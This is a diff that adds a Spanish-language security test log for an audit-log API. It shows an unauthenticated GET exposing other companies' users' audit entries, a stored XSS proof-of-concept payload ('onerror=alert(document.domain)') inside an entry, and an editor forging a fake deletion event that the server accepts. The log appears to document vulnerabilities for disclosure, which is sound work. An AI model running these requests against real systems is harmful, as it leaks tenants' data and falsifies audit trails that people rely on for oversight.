@@ -1,0 +1,11 @@
+# GET /auditoria sin token
+> GET /auditoria   [SIN token]
+< HTTP 200  (13 ms)
+  [{"id":"88","usuario_id":"victima_92f2bb","accion":"CLIENTES_CREAR: creó cliente <img src=x onerror=alert(document.domain)>","fecha_hora":"2026-11-26T05:42:32.694Z"},{"id":"87","usuario_id":"atacante_
+Usuarios distintos visibles en la auditoría: 9 (incluye 'victima_92f2bb': True)
+# Editor inserta un evento falso
+> POST /auditoria   [con token]
+  {"accion": "CLIENTES_ELIMINAR", "detalles": "elimin\u00f3 cliente ID 9999 (evento fabricado)"}
+< HTTP 201  (13 ms)
+  {"id":"89","usuario_id":"editor","accion":"CLIENTES_ELIMINAR: eliminó cliente ID 9999 (evento fabricado)","fecha_hora":"2026-11-26T05:42:37.233Z"}
+=> Auditoría pública con eventos de 9 usuarios de distintas empresas; se aceptan eventos fabricados (HTTP 201)
